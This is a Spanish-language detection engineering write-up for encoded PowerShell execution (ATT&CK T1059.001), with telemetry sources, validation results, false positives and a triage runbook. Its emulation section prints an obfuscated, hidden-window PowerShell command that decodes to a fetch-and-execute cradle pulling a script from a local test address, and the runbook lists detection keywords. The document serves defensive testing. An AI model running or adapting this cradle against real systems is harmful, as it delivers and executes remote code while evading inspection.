# T1059.001 - PowerShell Encoded Command Execution

## Hipótesis de detección
Un atacante ejecutará PowerShell con el parámetro `-EncodedCommand` (o sus abreviaciones `-enc`, `-ec`) seguido de una cadena Base64 para evadir la detección basada en texto y ejecutar payloads en memoria (fileless malware).

## Telemetría
- Sysmon Event ID 1 (Process Creation)
- PowerShell Event ID 4104 (Script Block Logging)

## Validación
- **True Positive (TP):** Se ejecutó el comando `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFg...`.
  - Wazuh: Rule ID 100010 (Level 12).
  - Elastic: Alert triggered.
- **True Negative (TN):** Se ejecutó `powershell.exe -NoProfile -Command "Get-Date"`. No se generaron alertas.

## Falsos Positivos conocidos
- Herramientas de gestión de endpoints (SCCM, Intune) que despliegan software mediante scripts codificados.
- Scripts de administradores de sistemas.

## Runbook de Triage
1. Extraer el comando Base64 del campo `CommandLine`.
2. Decodificarlo usando CyberChef (From Base64) o PowerShell (`[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("..."))`).
3. Analizar el script decodificado en busca de URLs, IPs o palabras clave maliciosas (ej. `DownloadString`, `IEX`, `Invoke-WebRequest`).
4. Escalar a Incidente si el script intenta descargar contenido de Internet o acceder a recursos compartidos.

## Emulación de la Técnica
Para validar esta detección, se ejecutó el siguiente comando en el endpoint Windows (simulando la técnica T1059.001):
```powershell
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
```
*(El comando decodificado intenta ejecutar: `IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/payload.ps1')`)*
